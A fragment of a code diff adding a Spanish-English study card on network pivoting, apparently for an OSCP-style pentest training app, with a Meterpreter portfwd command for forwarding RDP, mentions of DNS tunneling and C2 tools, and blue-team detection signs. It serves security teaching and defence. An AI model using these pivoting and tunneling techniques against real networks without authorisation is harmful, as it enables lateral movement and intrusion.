+      "**dns2tcp**, **dnscat2**: variantes DNS tunneling.\n" +
+      "**Metasploit portfwd** (dentro de Meterpreter):\n" +
+      "```\nportfwd add -l 8888 -p 3389 -r 192.168.1.5   # RDP forward\n```\n" +
+      "\n**Frampton** (2023): C2 with built-in pivoting, Rust-based.\n" +
+      "\n**Detection de pivoting (blue team):**\n" +
+      "• **Netflow analysis**: Machine que suddenly hace traffic a range interna donde antes no.\n" +
+      "• **Unusual protocols**: TLS a puertos raros (11601 de Ligolo), DNS outbound sostenido (iodine).\n" +
+      "• **Beacon detection**: intervals regulares.\n" +
+      "• **EDR con network telemetry**: process spawning connections a IPs internas.\n" +
+      "\n> 💡 **Ligolo-ng is the OSCP 2024 preferred method** — funciona nativo con todas las tools.\n" +
+      "> ⚠️ **DO NOT** pivotear más de necesario. Cada hop = más ruido y logs. Documentar cada action en engagements.",
+    examples: [
+      "OSCP AD segment: chain de 3 hops típico con Ligolo-ng.",
+      "HTB pro labs: Ligolo-ng es standard para atravesar cluster segments.",
+      "Real engagement: pivot desde web DMZ → internal servers → domain controller.",
+    ],
+    related: ["Post-explotación", "Sliver, Havoc y C2 modernos (post-Cobalt Strike)", "Meterpreter avanzado: migrate, extensions, priv escalation", "Herramientas de enumeración"],
   },
 
   // ── M30 · Burp Suite ─────────────────────────────────────────────────────
